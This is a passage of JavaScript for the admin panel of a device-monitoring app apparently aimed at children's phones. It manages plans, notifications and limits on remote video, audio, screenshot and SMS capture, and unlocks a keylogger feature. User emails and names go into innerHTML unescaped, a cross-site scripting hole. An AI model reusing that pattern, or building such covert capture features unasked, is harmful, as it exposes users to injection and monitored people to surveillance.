                // Skip profile/metadata keys
                if (['email', 'online', 'uid', 'timestamp', 'last_seen', 'profile', 'subscription'].includes(childKey)) return;
                
                const childNode = userRef[childKey];
                if (typeof childNode !== 'object') return;

                let shouldNotify = false;

                // Case A: Whole Account is Paid
                if (isPaidAccount) {
                    shouldNotify = true;
                }
                // Case B: Specific Device is Paid
                else if (childNode.subscription) {
                    shouldNotify = true;
                }

                if (shouldNotify) {
                     // Generate a new push key for each notification instance
                     const newNotifKey = push(ref(db, `user/${uid}/${childKey}/adminNotifications`)).key;
                     updates[`user/${uid}/${childKey}/adminNotifications/${newNotifKey}`] = notificationPayload;
                     deviceCount++;
                     
                     // Count usage per user (approx)
                     if (!paidCountAdded) {
                         paidCount++;
                         paidCountAdded = true;
                     }
                }
            });
        });

        if (paidCount === 0) {
            alert("No Paid Users found.");
            return;
        }

        if (Object.keys(updates).length > 0) {
            await update(ref(db), updates);
            alert(`Notification sent successfully!\n\n💎 Paid Users: ${paidCount}\n📱 Devices Targeted: ${deviceCount}`);
        } else {
            alert(`Found ${paidCount} paid users, but no active devices to notify.`);
        }
        
        closeModal(notificationModal);
        notificationMessageInput.value = '';

    } catch (error) {
        console.error("Error sending to paid users:", error);
        alert("Failed to send: " + error.message);
    }
}



async function sendNotificationToAll(message) {
    try {
        // Fetch fresh list of users
        const snapshot = await get(ref(db, 'All_Users_List'));
        if (!snapshot.exists()) {
            alert("No users found to notify.");
            return;
        }

        const users = snapshot.val();
        const updates = {};
        const notificationPayload = {
            title: "FamToolApp Notification",
            message: message,
            timestamp: serverTimestamp(),
            read: false
        };

        // Iterate through all users and their devices/children
        Object.keys(users).forEach(uid => {
            const userDevices = users[uid];
            if (typeof userDevices === 'object') {
                Object.keys(userDevices).forEach(childKey => {
                    // Skip profile/metadata keys
                    if (['email', 'online', 'uid', 'timestamp', 'last_seen', 'profile'].includes(childKey)) return;
                    
                    // Generate a new push key for the notification
                    const newNotifKey = push(ref(db, `user/${uid}/${childKey}/adminNotifications`)).key;
                    updates[`user/${uid}/${childKey}/adminNotifications/${newNotifKey}`] = notificationPayload;
                });
            }
        });

        if (Object.keys(updates).length > 0) {
            await update(ref(db), updates);
            alert("Notification sent to all users successfully!");
        } else {
            alert("No valid devices found to send notifications.");
        }
        
        closeModal(notificationModal);
        notificationMessageInput.value = '';

    } catch (error) {
        console.error("Error sending to all:", error);
        alert("Failed to send notification: " + error.message);
    }
}

async function sendNotificationToUser(userId, message) {
    const { childKey } = selectedUserInfo;
    const notificationPayload = {
        title: "FamToolApp Notification",
        message: message,
        timestamp: serverTimestamp(),
        read: false
    };

    try {
        const updates = {};
        
        // If 'all' devices selected for the user, send to all their devices
        if (childKey === 'all') {
             const snapshot = await get(ref(db, `user/${userId}`));
             if (snapshot.exists()) {
                 const data = snapshot.val();
                 Object.keys(data).forEach(key => {
                     // Check if it's a valid device node
                     if (key !== 'profile' && typeof data[key] === 'object' && !['email','online','uid'].includes(key)) {
                         const newKey = push(ref(db, `user/${userId}/${key}/adminNotifications`)).key;
                         updates[`user/${userId}/${key}/adminNotifications/${newKey}`] = notificationPayload;
                     }
                 });
             }
        } else {
             // Send to specific device
             const newKey = push(ref(db, `user/${userId}/${childKey}/adminNotifications`)).key;
             updates[`user/${userId}/${childKey}/adminNotifications/${newKey}`] = notificationPayload;
        }

        if (Object.keys(updates).length > 0) {
            await update(ref(db), updates);
            alert(`Notification sent to ${selectedUserInfo.userName} successfully!`);
        } else {
            alert("No target device found.");
        }
        
        closeModal(notificationModal);
        notificationMessageInput.value = '';

    } catch (err) {
        console.error("Error sending single user notification:", err);
        alert("Error: " + err.message);
    }
}

// --- LIMITS FUNCTIONS ---
updateLimitsBtn.addEventListener('click', () => {
    const { userId, childKey } = selectedUserInfo;
    if (!userId || !childKey || childKey === 'all') {
        alert("Please select a specific device first.");
        return;
    }

    const updates = {};
    const path = `user/${userId}/${childKey}/limits`;
    
    // Parse inputs or use existing defaults if empty logic needed? 
    // Usually if empty, we might not want to update or update to 0. 
    // Assuming user inputs valid numbers.
    const v = parseInt(limitVideoInput.value) || 0;
    const a = parseInt(limitAudioInput.value) || 0;
    const i = parseInt(limitImageInput.value) || 0;
    const s = parseInt(limitScreenshotInput.value) || 0;
    const sms = parseInt(limitSmsInput.value) || 0;

    updates[`${path}/maxVideoLimit`] = v;
    updates[`${path}/maxAudioLimit`] = a;
    updates[`${path}/maxImageLimit`] = i;
    updates[`${path}/maxScreenshotLimit`] = s;
    updates[`${path}/maxSmsLimit`] = sms;

    update(ref(db), updates)
        .then(() => alert("Limits updated successfully!"))
        .catch(e => alert("Error updating limits: " + e.message));
});

function loadLimits(userId, childKey) {
    if (limitsListener) {
        // Find if we stored the ref to turn it off?
        // onValue returns unsubscribe function in newer SDKs but here we seem to pass callback.
        // We usually use off(ref, 'value', callback).
        // My previous code pattern uses off().
    }
    
    // Reset inputs
    limitVideoInput.value = '';
    limitAudioInput.value = '';
    limitImageInput.value = '';
    limitScreenshotInput.value = '';
    limitSmsInput.value = '';

    if (!userId || !childKey || childKey === 'all') {
        limitsContainer.style.display = 'none';
        return;
    }

    limitsContainer.style.display = 'block';
    const path = `user/${userId}/${childKey}/limits`;
    
    // Use onValue for realtime updates in Admin too, so if parent changes (unlikely) or another admin changes, we see it.
    // Or just get once. Realtime is better for "Editing" mode.
    const limitsRef = ref(db, path);
    
    // Detach previous if any (Need to store ref and callback effectively)
    // For simplicity, let's just use { onlyOnce: true } if we don't want realtime, 
    // or just handle the listener replacement properly.
    // Since I don't have a global var for the callback of limits, I'll define one.
    
    // Better: Helper to manage single listener for limits
    if (window.currentLimitsRef && window.currentLimitsCallback) {
        off(window.currentLimitsRef, 'value', window.currentLimitsCallback);
    }

    window.currentLimitsRef = limitsRef;
    window.currentLimitsCallback = (snap) => {
        const val = snap.val() || {};
        limitVideoInput.value = val.maxVideoLimit !== undefined ? val.maxVideoLimit : 4;
        limitAudioInput.value = val.maxAudioLimit !== undefined ? val.maxAudioLimit : 5;
        limitImageInput.value = val.maxImageLimit !== undefined ? val.maxImageLimit : 5;
        limitScreenshotInput.value = val.maxScreenshotLimit !== undefined ? val.maxScreenshotLimit : 3;
        limitSmsInput.value = val.maxSmsLimit !== undefined ? val.maxSmsLimit : 0;
    };

    onValue(limitsRef, window.currentLimitsCallback);
}

// ==========================================
// CHAT UNREAD BADGE LISTENER
// ==========================================

// Get last read timestamp from localStorage
function getLastReadTimestamp(userId, childKey) {
    const key = `chat_read_${userId}_${childKey}`;
    return parseInt(localStorage.getItem(key)) || 0;
}

// Mark chat as read (save current timestamp or specific timestamp)
function markChatAsRead(userId, childKey, timestamp = null) {
    const key = `chat_read_${userId}_${childKey}`;
    // Use provided timestamp or fallback to current time
    const timeToSave = timestamp || Date.now();
    
    // Get existing to prevent overwriting with older time
    const existing = parseInt(localStorage.getItem(key)) || 0;
    
    if (timeToSave >= existing) {
        localStorage.setItem(key, timeToSave.toString());
    }
    
    // Update badge immediately
    const chatBadge = document.getElementById('chat-unread-badge');
    const chatBtn = document.getElementById('chat-category-btn');
    if (chatBadge) chatBadge.style.display = 'none';
    if (chatBtn) chatBtn.classList.remove('has-unread');
}

function setupChatUnreadListener(userId, childKey) {
    // Remove previous listener
    if (window.currentChatRef && window.currentChatCallback) {
        off(window.currentChatRef, 'value', window.currentChatCallback);
    }
    
    const chatBadge = document.getElementById('chat-unread-badge');
    const chatBtn = document.getElementById('chat-category-btn');
    
    if (!chatBadge || !chatBtn) return;
    
    // Hide badge initially
    chatBadge.style.display = 'none';
    chatBtn.classList.remove('has-unread');
    
    if (!userId || !childKey || childKey === 'all') {
        return;
    }
    
    const chatPath = `user/${userId}/${childKey}/chat`;
    const chatRef = ref(db, chatPath);
    
    window.currentChatRef = chatRef;
    window.currentChatCallback = (snapshot) => {
        if (!snapshot.exists()) {
            chatBadge.style.display = 'none';
            chatBtn.classList.remove('has-unread');
            return;
        }
        
        const messages = snapshot.val();
        const lastReadTime = getLastReadTimestamp(userId, childKey);
        
        // Count only 'user' messages that came AFTER last read time
        const unreadMessages = Object.values(messages).filter(msg => {
            if (msg.sender !== 'user') return false;
            const msgTime = msg.timestamp || 0;
            return msgTime > lastReadTime;
        });
        
        const unreadCount = unreadMessages.length;
        
        if (unreadCount > 0) {
            chatBadge.textContent = unreadCount > 99 ? '99+' : unreadCount;
            chatBadge.style.display = 'flex';
            chatBtn.classList.add('has-unread');
        } else {
            chatBadge.style.display = 'none';
            chatBtn.classList.remove('has-unread');
        }
    };
    
    onValue(chatRef, window.currentChatCallback);
}


// ==========================================
// PART 3: AUTH & USER HANDLING
// ==========================================

document.getElementById('login-btn').addEventListener('click', () => {
    const e = document.getElementById('email').value;
    const p = document.getElementById('password').value;
    signInWithEmailAndPassword(auth, e, p).catch(err => alert("Login Error: " + err.message));
});

document.getElementById('logout-btn').addEventListener('click', () => signOut(auth));

const childSelector = document.getElementById('child-selector');

onAuthStateChanged(auth, user => {
    if (user) {
        onValue(ref(db, `admins/${user.uid}`), (s) => {
            if (s.exists() && s.val() === true) {
                loginContainer.style.display = 'none';
                dashboard.style.display = 'flex';
                loadUsers();
            } else { signOut(auth); alert("Not Admin"); }
        });
    } else {
        loginContainer.style.display = 'flex';
        dashboard.style.display = 'none';
    }
});

function loadUsers() {
    onValue(ref(db, 'All_Users_List'), (snap) => {
        userList.innerHTML = '';
        const data = snap.val();
        if (!data) return;

        const users = {};

        Object.keys(data).forEach(uid => {
            if (data[uid]) {
                users[uid] = {
                    email: '',
                    children: {},
                    online: false
                };

                const userData = data[uid];

                Object.keys(userData).forEach(childKey => {
                    const childData = userData[childKey];

                    // Skip profile & subscription nodes
                    if (childKey === 'profile' || childKey === 'subscription' || childKey === 'limits') {
                        if (childKey === 'subscription') users[uid].subscription = childData;
                        return;
                    }

                    // Filter out metadata keys so they don't count as devices
                    if (['email', 'online', 'uid', 'timestamp', 'last_seen', 'emailVerified', 'gmail_verified'].includes(childKey)) {

                        if (childKey === 'email') users[uid].email = userData[childKey];
                        if (childKey === 'online') users[uid].online = userData[childKey];
                        return;
                    }

                    // Remaining objects are device folders
                    if (typeof childData === 'object' && childData !== null) {
                        users[uid].children[childKey] = childData;

                        // Check inside child for email (legacy structure support)
                        if (childData.email) {
                            users[uid].email = childData.email;
                        }
                        if (childData.online) {
                            users[uid].online = true;
                        }
                    }
                });
            }
        });

        userList.innerHTML = '';
        let count = 0;
        Object.keys(users).forEach(uid => {
            count++;
            const u = users[uid];
            const li = document.createElement('li');
            li.className = 'user-list-item';
            li.setAttribute('data-uid', uid); // Add UID for Search
            if (selectedUserInfo.userId === uid) li.classList.add('active');
            
            // Apply Alert Class if needed
            if (usersWithAlerts.has(uid)) {
                li.classList.add('has-alert');
            }

            // Extract child info for the sidebar
            let childNames = [];
            let installDateStr = "N/A";
            
            if (u.children) {
                const childKeys = Object.keys(u.children);
                childKeys.forEach(ck => {
                    const child = u.children[ck];
                    if (child.nameChild && child.nameChild !== ck) {
                         childNames.push(child.nameChild);
                    } else {
                         childNames.push(ck);
                    }
                    
                    // Grab the first valid timestamp we find among children
                    if (installDateStr === "N/A" && child.timestamp) {
                        const dt = new Date(child.timestamp);
                        installDateStr = `${dt.toLocaleDateString()} ${dt.toLocaleTimeString()}`;
                    }
                });
            }
            
            const displayChildNames = childNames.length > 0 ? childNames.join(', ') : 'No Devices';

            // Sidebar: Show only online status indicator (gray/neutral for verification - fetched on-demand)
            li.innerHTML = `<span class="verification-status ${u.online ? 'verified' : 'not-verified'}">●</span>
                            <div class="user-list-details">
                                <div class="user-name"><b>${u.email || 'N/A'}</b></div>
                                <div class="sidebar-child-name">🧒 ${displayChildNames}</div>
                                <div class="sidebar-install-date">📅 ${installDateStr}</div>
                                <div class="user-uid-small">UID: ${uid}</div>
                            </div>`;

            li.onclick = () => {
                document.querySelectorAll('.user-list-item').forEach(i => i.classList.remove('active'));
                li.classList.add('active');
                
                // Clear Alert on View
                if (usersWithAlerts.has(uid)) {
                    usersWithAlerts.delete(uid);
                    li.classList.remove('has-alert');
                }
                
                selectedUserInfo = { userId: uid, userName: u.email || uid, children: u.children };
                displayUserDetails(selectedUserInfo);
            };
            userList.appendChild(li);
        });
        sidebarTitle.textContent = `Users (${count})`;
    });
}

// Helper function to parse verification status (handles string "true" and boolean true)
function parseVerificationStatus(value) {
    if (value === true || value === 'true' || value === 'True' || value === 'TRUE') {
        return true;
    }
    return false;
}

    if (setPlanFreeBtn) setPlanFreeBtn.onclick = () => handlePlanUpdate('Free');
    if (setPlanBasicBtn) setPlanBasicBtn.onclick = () => handlePlanUpdate('Basic');
    if (setPlanGoldBtn) setPlanGoldBtn.onclick = () => handlePlanUpdate('Gold');
    if (setPlanPlatinumBtn) setPlanPlatinumBtn.onclick = () => handlePlanUpdate('Platinum');

    // --- MANAGE PLAN (Manual) ---
    function handlePlanUpdate(planType) {
        if (!selectedUserInfo.userId || !selectedUserInfo.childKey) {
            alert("Please select a user and device first.");
            return;
        }

        const { userId, childKey } = selectedUserInfo;
        const now = Date.now();
        const thirtyDays = 30 * 24 * 60 * 60 * 1000;
        
        // Define Plan Configs
        const PLANS = {
            'Free': {
                name: 'Free',
                video: 4, audio: 5, photo: 5, screenshot: 3, sms: 0,
                duration: 30, // 30 seconds
                expiry: null 
            },
            'Basic': {
                name: 'Basic',
                video: 20, audio: 20, photo: 20, screenshot: 20, sms: 0,
                duration: 30, // 30 seconds
                expiry: now + thirtyDays
            },
            'Gold': {
                name: 'Gold',
                video: 50, audio: 50, photo: 50, screenshot: 50, sms: 10,
                duration: 120, // 2 minutes
                expiry: now + thirtyDays
            },
            'Platinum': {
                name: 'Platinum',
                video: 9999, audio: 9999, photo: 9999, screenshot: 9999, sms: 50,
                duration: 300, // 5 minutes
                expiry: now + thirtyDays
            }
        };

        const plan = PLANS[planType];
        if (!plan) return;

        if (!confirm(`Are you sure you want to set the ${plan.name} Plan for this device?\n\n- Limits will be updated.\n- Expiry will be set to ${plan.expiry ? '30 Days from now' : 'Expired/None'}.`)) {
            return;
        }

        const updates = {};
        const base = `user/${userId}/${childKey}`;

        // 1. Update Limits
        updates[`${base}/limits/maxVideoLimit`] = plan.video;
        updates[`${base}/limits/maxAudioLimit`] = plan.audio;
        updates[`${base}/limits/maxImageLimit`] = plan.photo;
        updates[`${base}/limits/maxScreenshotLimit`] = plan.screenshot;
        updates[`${base}/limits/maxSmsLimit`] = plan.sms;

        // NEW: Update Recording Duration (in seconds)
        // Free/Basic: 30s, Gold: 120s (2m), Plat: 300s (5m)
        if(plan.duration) {
            updates[`${base}/limits/maxRecordingDuration`] = plan.duration;
        }

        // Reset counts for new plan cycle
        updates[`${base}/limits/videoCount`] = 0;
        updates[`${base}/limits/audioCount`] = 0;
        updates[`${base}/limits/imageCount`] = 0;
        updates[`${base}/limits/screenshotCount`] = 0;
        updates[`${base}/limits/smsCount`] = 0;
        // Important: Update Plan Name in Limits too if app uses it
        updates[`${base}/limits/plan`] = plan.name; 
        
        // 2. Update Subscription Object
        if (planType === 'Free') {
            updates[`${base}/subscription`] = {
                planName: 'Free',
                startDate: now,
                expiryDate: now - 1000, 
                status: 'expired'
            };
        } else {
            updates[`${base}/subscription`] = {
                planName: plan.name,
                planId: planType.toLowerCase(), // FIXED: Added planId for user script compatibility
                startDate: now,
                expiryDate: plan.expiry,
                status: 'active'
            };

            // Unlock features automatically when upgrading to a paid plan
            updates[`${base}/lockedFeatures/sms`] = { isLocked: false, unlockTime: 0 };
            updates[`${base}/lockedFeatures/calls`] = { isLocked: false, unlockTime: 0 };
            updates[`${base}/lockedFeatures/notifications`] = { isLocked: false, unlockTime: 0 };
            updates[`${base}/lockedFeatures/keylogger`] = { isLocked: false, unlockTime: 0 };
        }

        update(ref(db), updates)
            .then(() => {
                alert(`✅ Plan updated to ${plan.name} successfully!`);
                // Refresh UI Limits
                if(limitVideoInput) limitVideoInput.value = plan.video;
                if(limitAudioInput) limitAudioInput.value = plan.audio;
                if(limitImageInput) limitImageInput.value = plan.photo;
                if(limitScreenshotInput) limitScreenshotInput.value = plan.screenshot;
                if(limitSmsInput) limitSmsInput.value = plan.sms;
            })
            .catch(err => {
                console.error("Plan update failed:", err);
                alert("Error updating plan: " + err.message);
            });
    }

async function displayUserDetails(userInfo) {
    mainContentTitle.textContent = userInfo.userName;
    detailsView.style.display = 'block';

    // === ON-DEMAND PROFILE FETCH ===
    // Fetch profile data from 'user/{uid}/profile' path
    const expiryAlertContainer = document.getElementById('expiry-alert-container') || createExpiryAlertContainer();
    expiryAlertContainer.innerHTML = ''; // Clear previous alerts
    expiryAlertContainer.style.display = 'none';

    // Create/get verification badge container in dashboard title
    let verificationBadgeSpan = document.getElementById('dashboard-verification-badge');
    if (!verificationBadgeSpan) {
        verificationBadgeSpan = document.createElement('span');
        verificationBadgeSpan.id = 'dashboard-verification-badge';
        verificationBadgeSpan.style.marginLeft = '10px';
        mainContentTitle.parentNode.insertBefore(verificationBadgeSpan, mainContentTitle.nextSibling);
    }
    verificationBadgeSpan.innerHTML = '<span style="color: gray;">⏳</span>'; // Loading state

    try {
        // Fetch profile from 'user/{uid}/profile'
        const profileRef = ref(db, `user/${userInfo.userId}/profile`);
        const profileSnapshot = await get(profileRef);
        const profileData = profileSnapshot.val();

        console.log(`[ON-DEMAND] Fetched profile for ${userInfo.userId}:`, profileData);

        let isEmailVerified = false;
        let profileTimestamp = null;

        if (profileData) {
            // Check for emailVerified OR gmail_verified (loose check for boolean/string)
            isEmailVerified = parseVerificationStatus(profileData.emailVerified) || 
                              parseVerificationStatus(profileData.gmail_verified);
            profileTimestamp = profileData.timestamp || null;

            // Store profile in selectedUserInfo for other functions
            selectedUserInfo.profile = {
                emailVerified: isEmailVerified,
                timestamp: profileTimestamp
            };
        }

        // ==========================================
        // [NEW] FETCH PLAN / SUBSCRIPTION (Robust & Optimized)
        // ==========================================
        let planName = 'Free'; 
        let planColor = '#95a5a6'; // Free Gray
        let childPlanDetails = []; // To store details of each child's plan

        try {
            // New Strategy: Instead of fetching one global plan, we iterate known children from 'userInfo'
            // Since we already have 'userInfo' loaded from All_Users_List, this is fast.
            
            if (userInfo.children) {
                 const childKeys = Object.keys(userInfo.children);
                 
                 // We need to fetch subscription for each child.
                 // To keep it fast ("पलक झपकते ही"), we will run these fetches in parallel using Promise.all
                 // We check user/{uid}/{childKey}/subscription for each child.

                 const planPromises = childKeys.map(key => 
                     get(ref(db, `user/${userInfo.userId}/${key}/subscription`))
                     .then(snap => ({ key, val: snap.val() }))
                     .catch(err => ({ key, val: null }))
                 );

                 const results = await Promise.all(planPromises);

                 // Analyze results
                 let hasPlatinum = false;
                 let hasGold = false;
                 let hasBasic = false;

                 results.forEach(res => {
                     const p = res.val ? res.val.planName : null;
                     if(p) {
                         const cName = userInfo.children[res.key].name || 'Child';
                         childPlanDetails.push(`${cName}: ${p}`);
                         
                         if(p === 'Platinum') hasPlatinum = true;
                         else if(p === 'Gold') hasGold = true;
                         else if(p === 'Basic') hasBasic = true;
                     }
                 });

                 // Determine "Override" label for the User Card
                 if (hasPlatinum) planName = 'Platinum (Mixed)';
                 else if (hasGold) planName = 'Gold (Mixed)';
                 else if (hasBasic) planName = 'Basic (Mixed)';
                 else {
                     // Fallback check: Global Subscription (Old Logic compatibility)
                     const globalSubSnap = await get(ref(db, `user/${userInfo.userId}/subscription`));
                     if(globalSubSnap.exists() && globalSubSnap.val().planName) {
                          planName = globalSubSnap.val().planName;
                     }
                 }
            } else {
                 // No children data in All_Users_List? Fallback to Global
                 const subRef = ref(db, `user/${userInfo.userId}/subscription`);
                 const subSnap = await get(subRef);
                 if(subSnap.exists() && subSnap.val().planName) {
                    planName = subSnap.val().planName;
                 }
            }

            // Colors based on highest tier found
            if(planName.includes('Gold')) planColor = '#f1c40f'; 
            if(planName.includes('Platinum')) planColor = '#9b59b6';
            if(planName.includes('Basic')) planColor = '#3498db';
            
        } catch(e) { console.error("Sub fetch error", e); }


        // === UPDATE DASHBOARD UI ===
        // A. Verification Badge next to user name + PLAN NAME + UID
        let badgeHtml = '';
        
        // Add Detailed Tooltip for Mixed Plans
        let planTooltip = childPlanDetails.length > 0 ? `title="${childPlanDetails.join(', ')}"` : '';
        if (isEmailVerified) {
            badgeHtml = '<span class="email-verified-badge" title="Email Verified" style="font-size: 1.2rem;">✅</span>';
        } else {
            badgeHtml = '<span class="email-unverified-badge" title="Email Not Verified" style="font-size: 1.2rem;">❌</span>';
        }
        
        // Plan Badge
        badgeHtml += `<span ${planTooltip} style="cursor:help; background:${planColor}; color:white; padding:4px 8px; border-radius:4px; font-size:0.85rem; margin-left:12px; font-weight:bold; letter-spacing:0.5px; text-transform:uppercase; vertical-align:middle; box-shadow:0 2px 5px rgba(0,0,0,0.1);">${planName} Plan</span>`;
        
        // UID Badge (Requested) - Small and clear
        badgeHtml += `<span style="background:#34495e; color:#ecf0f1; padding:4px 8px; border-radius:4px; font-size:0.8rem; margin-left:8px; font-family:monospace; vertical-align:middle;">UID: ${userInfo.userId.substring(0,6)}..</span>`;
        
        verificationBadgeSpan.innerHTML = badgeHtml;

        // B. 3-Day Expiry Logic for Unverified Users
        if (!isEmailVerified && profileTimestamp) {
            const currentTime = Date.now();
            const timeDifference = currentTime - profileTimestamp;
            const threeDaysInMs = 259200000; // 3 days in milliseconds

            if (timeDifference > threeDaysInMs) {
                const daysExpired = Math.floor(timeDifference / 86400000); // Convert to days
                expiryAlertContainer.innerHTML = `
                    <div class="expiry-alert">
                        <span class="expiry-icon">⛔</span>
                        <span class="expiry-text">EXPIRED USER (${daysExpired} Days+) - DELETE NOW</span>
                    </div>
                `;
                expiryAlertContainer.style.display = 'block';
            }
        }

    } catch (error) {
        console.error(`[ON-DEMAND] Failed to fetch profile for ${userInfo.userId}:`, error);
        verificationBadgeSpan.innerHTML = '<span style="color: orange;" title="Could not fetch verification status">⚠️</span>';
    }

    const childSelectorContainer = document.querySelector('.child-selector-container');
    const childSelector = document.createElement('select');
    childSelector.id = 'child-selector';
    childSelector.className = 'child-selector';
    
    // --- NEW: Elements for Blocking and Features ---
    const blockRef = ref(db, `user/${userInfo.userId}/account/isBlocked`);
    const blockBtn = document.getElementById('block-user-btn');

    // Remove the global trial end code that blocked everything
    let forceTrialBtn = document.getElementById('force-trial-btn');
    if (forceTrialBtn) {
        const newForceTrialBtn = forceTrialBtn.cloneNode(true);
        forceTrialBtn.parentNode.replaceChild(newForceTrialBtn, forceTrialBtn);
    } 

    // 1. SETUP BLOCK BUTTON STATE (Account Level) - Using onValue for Realtime Updates
    // This ensures that if you come back, it fetches the latest state immediately
    onValue(blockRef, (snap) => {
        const isBlocked = snap.val() || false;
        // Always get the current button from DOM in case of re-renders
        const currentBlockBtn = document.getElementById('block-user-btn');
        if (currentBlockBtn) {
            if (isBlocked) {
                currentBlockBtn.innerText = "UNBLOCK USER 🔓";
                currentBlockBtn.style.background = "#2ecc71"; // Green
            } else {
                currentBlockBtn.innerText = "🔒 BLOCK USER";
                currentBlockBtn.style.background = "#e74c3c"; // Red
            }
        }
    }, { onlyOnce: false }); // Keep listening while this user is open? 
    // Actually, onValue might cause issues if we switch users quickly and don't off()
    // Better to use get() but ensure we target the *current* element safely, 
    // OR use a variable to track the listener.
    
    // Let's use get() but make sure we update the specific element correctly 
    // and rely on the button click to update UI immediately too.
    
    // RE-IMPLEMENTATION:
    
    // Remove old listeners by cloning
    if(blockBtn) {
        const newBlockBtn = blockBtn.cloneNode(true);
        blockBtn.parentNode.replaceChild(newBlockBtn, blockBtn);

        // Fetch Initial State
        get(blockRef).then((snap) => {
            const isBlocked = snap.val() || false;
            // Update the NEW button
            if (isBlocked) {
                newBlockBtn.innerText = "UNBLOCK USER 🔓";
                newBlockBtn.style.background = "#2ecc71"; // Green
            } else {
                newBlockBtn.innerText = "🔒 BLOCK USER";
                newBlockBtn.style.background = "#e74c3c"; // Red
            }
        });

        // Click Handler
        newBlockBtn.onclick = async () => {
            // Re-fetch to be sure of current state
            const snap = await get(blockRef);
            const currentStatus = snap.val() || false;
            const newStatus = !currentStatus;
            
            if(confirm(`Are you sure you want to ${newStatus ? 'BLOCK' : 'UNBLOCK'} this user?`)) {
                await set(blockRef, newStatus);
                // Manually update UI immediately for feedback
                if (newStatus) {
                    newBlockBtn.innerText = "UNBLOCK USER 🔓";
                    newBlockBtn.style.background = "#2ecc71";
                } else {
                    newBlockBtn.innerText = "🔒 BLOCK USER";
                    newBlockBtn.style.background = "#e74c3c";
                }
            }
        };
    }

    const contactCheck = document.getElementById('unlock-contact-list-check');
    const smsCheck = document.getElementById('unlock-send-sms-check');

    // --- NEW: Force Trial Expired Toggle (Device Level) ---
    forceTrialBtn = document.getElementById('force-trial-btn');

    // 2. SETUP MANUAL FEATURE UNLOCK (Device Level)
    // Helper to update checkboxes based on current device
    function updateManualFeaturesUI(uid, cKey) {
        // ALWAYS fetch the current elements from DOM because they might have been replaced/cloned
        const currentContactCheck = document.getElementById('unlock-contact-list-check');
        const currentSmsCheck = document.getElementById('unlock-send-sms-check');
        const currentTrialBtn = document.getElementById('force-trial-btn');

        if(!cKey || cKey === 'all') {
             if(currentContactCheck) { currentContactCheck.checked = false; currentContactCheck.disabled = true; }
             if(currentSmsCheck) { currentSmsCheck.checked = false; currentSmsCheck.disabled = true; }
             if(currentTrialBtn) { 
                currentTrialBtn.style.opacity = '0.5'; 
                currentTrialBtn.disabled = true; 
                currentTrialBtn.innerText = "⏱️ SELECT DEVICE";
             }
             return;
        }

        if(currentContactCheck) currentContactCheck.disabled = false;
        if(currentSmsCheck) currentSmsCheck.disabled = false;
        if(currentTrialBtn) {
            currentTrialBtn.style.opacity = '1';
            currentTrialBtn.disabled = false;
        }

        const manualRef = ref(db, `user/${uid}/${cKey}/manualFeatures`);
        get(manualRef).then(snap => {
            const data = snap.val() || {};
            if(currentContactCheck) currentContactCheck.checked = data.contactList === true;
            if(currentSmsCheck) currentSmsCheck.checked = data.sendSms === true;
        });

        if (currentTrialBtn) {
            const forceTrialRef = ref(db, `user/${uid}/${cKey}/account/isTrialExpired`);
            get(forceTrialRef).then((snap) => {
                const isTrialExpired = snap.val() || false;
                if (isTrialExpired) {
                    currentTrialBtn.innerText = "RESTORE TRIAL ↩️";
                    currentTrialBtn.style.background = "#2ecc71";
                } else {
                    currentTrialBtn.innerText = "⏱️ FORCE END TRIAL";
                    currentTrialBtn.style.background = "#f39c12";
                }
            });
        }
    }

    if (forceTrialBtn) {
        const newForceTrialBtn = forceTrialBtn.cloneNode(true);
        forceTrialBtn.parentNode.replaceChild(newForceTrialBtn, forceTrialBtn);

        newForceTrialBtn.onclick = async () => {
            const cKey = document.getElementById('child-selector').value;
            if(!cKey || cKey === 'all') return;

            const forceTrialRef = ref(db, `user/${userInfo.userId}/${cKey}/account/isTrialExpired`);
            const snap = await get(forceTrialRef);
            const currentStatus = snap.val() || false;
            const newStatus = !currentStatus;

            if(confirm(`Are you sure you want to ${newStatus ? 'FORCE END THE TRIAL' : 'RESTORE TRIAL'} for this SPECIFIC device (${cKey})?\n\nIf Yes, they will immediately be blocked from accessing this device.`)) {
                await set(forceTrialRef, newStatus);
                if (newStatus) {
                    newForceTrialBtn.innerText = "RESTORE TRIAL ↩️";
                    newForceTrialBtn.style.background = "#2ecc71";
                } else {
                    newForceTrialBtn.innerText = "⏱️ FORCE END TRIAL";
                    newForceTrialBtn.style.background = "#f39c12";
                }
            }
        };
    }

    // Checkbox Listeners
    if(contactCheck) {
        const newContactCheck = contactCheck.cloneNode(true);
        contactCheck.parentNode.replaceChild(newContactCheck, contactCheck);
        
        newContactCheck.onchange = async () => {
             // Re-fetch childKey to ensure we use the selected one
            const cKey = document.getElementById('child-selector').value;
            if(!cKey || cKey === 'all') return;
            
            await update(ref(db, `user/${userInfo.userId}/${cKey}/manualFeatures`), {
                contactList: newContactCheck.checked
            });
        };
    }
    
    if(smsCheck) {
        const newSmsCheck = smsCheck.cloneNode(true);
        smsCheck.parentNode.replaceChild(newSmsCheck, smsCheck);
        
        newSmsCheck.onchange = async () => {
             // Re-fetch childKey
             const cKey = document.getElementById('child-selector').value;
            if(!cKey || cKey === 'all') return;
            
            await update(ref(db, `user/${userInfo.userId}/${cKey}/manualFeatures`), {
                sendSms: newSmsCheck.checked
            });
        };
    }

    
    childSelector.innerHTML = '<option value="all">All Devices</option>';
    const deviceKeys = userInfo.children ? Object.keys(userInfo.children) : []; // Safety check
    deviceKeys.forEach(childKey => {
        const child = userInfo.children[childKey];
        
        // Let's build a descriptive text including the child's name, device, and installation time.
        let deviceName = child.nameDevice || 'Unknown Device';
        let installDateStr = '';
        
        let cTimestamp = child.timestamp; 
        if (!cTimestamp && userInfo.profile && userInfo.profile.timestamp) {
            cTimestamp = userInfo.profile.timestamp; 
        }

        if (cTimestamp) {
            const dt = new Date(cTimestamp);
            installDateStr = ` (Installed: ${dt.toLocaleDateString()} ${dt.toLocaleTimeString()})`;
        }
        
        const childName = child.nameChild || childKey;
        const displayText = `${childName} - ${deviceName}${installDateStr}`;
        
        childSelector.innerHTML += `<option value="${childKey}">Child: ${displayText}</option>`;
    });
    
    childSelectorContainer.innerHTML = '';
    childSelectorContainer.appendChild(childSelector);
    
    if (deviceKeys.length === 1) {
        childSelector.value = deviceKeys[0];
        selectedUserInfo.childKey = deviceKeys[0];
        childSelectorContainer.style.display = 'none';
        
        // Initial Update for single device
        setTimeout(() => {
             updateManualFeaturesUI(selectedUserInfo.userId, selectedUserInfo.childKey);
        }, 100);

    } else {
        // If coming back to a user with previously selected child, try to restore or default to 'all'
        if(selectedUserInfo.childKey && deviceKeys.includes(selectedUserInfo.childKey)) {
             childSelector.value = selectedUserInfo.childKey;
        } else {
